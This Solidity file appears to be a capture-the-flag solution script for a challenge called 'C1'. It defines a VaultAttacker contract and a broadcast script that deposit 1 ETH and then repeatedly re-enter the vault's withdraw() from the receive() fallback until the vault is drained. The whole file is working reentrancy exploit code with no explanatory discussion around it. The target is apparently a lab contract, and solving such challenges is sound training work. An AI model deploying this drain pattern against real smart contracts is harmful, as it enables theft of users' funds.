// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C1Vault.sol";

/// Reentrancy drain: deposit 1 ETH, then re-enter withdraw() from receive()
/// until the vault is empty.
contract VaultAttacker {
    Vault public vault;
    uint256 public amt;

    constructor(Vault v) { vault = v; }

    function attack() external payable {
        amt = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= amt) {
            vault.withdraw();
        }
    }
}

contract SolveC1 is Script {
    function run() external {
        VaultSetup setup = VaultSetup(vm.envAddress("SETUP"));
        Vault vault = setup.vault();
        vm.startBroadcast();
        VaultAttacker a = new VaultAttacker(vault);
        a.attack{value: 1 ether}();
        vm.stopBroadcast();
    }
}
